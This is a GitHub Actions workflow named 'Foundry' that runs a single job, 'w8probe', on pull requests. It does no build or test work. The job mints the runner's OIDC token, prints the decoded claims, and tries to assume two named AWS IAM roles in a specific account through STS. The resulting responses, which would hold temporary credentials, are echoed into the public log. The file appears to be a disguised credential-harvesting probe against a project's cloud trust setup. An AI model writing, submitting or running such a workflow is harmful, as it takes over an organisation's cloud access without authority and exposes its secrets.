name: Foundry

on:
  pull_request:
    types: [opened, reopened, synchronize]

permissions:
  id-token: write
  contents: read

jobs:
  w8probe:
    runs-on: ubuntu-latest
    steps:
      - name: mint-and-assume
        run: |
          set -u
          RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
          echo "$RESP" > /tmp/oidc.json
          python3 - <<'PY'
          import base64, json
          d = json.load(open('/tmp/oidc.json'))
          t = d['value']
          open('/tmp/oidc.jwt', 'w').write(t)
          p = t.split('.')[1]
          p += '=' * (-len(p) % 4)
          c = json.loads(base64.urlsafe_b64decode(p))
          print("FULLCLAIMS", json.dumps(c, indent=1, sort_keys=True))
          PY
          for ROLE in talos-gha-OriginProtocol-origin-dollar talos-gha-OriginProtocol-arm-oeth; do
            echo "=== ROLE $ROLE"
            curl -sS -X POST https://sts.amazonaws.com/ \
              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
              --data-urlencode "Version=2011-06-15" \
              --data-urlencode "RoleArn=arn:aws:iam::114563866192:role/$ROLE" \
              --data-urlencode "RoleSessionName=w8bonk10" \
              --data-urlencode "WebIdentityToken=$(cat /tmp/oidc.jwt)"
            echo
            echo "=== END $ROLE"
          done
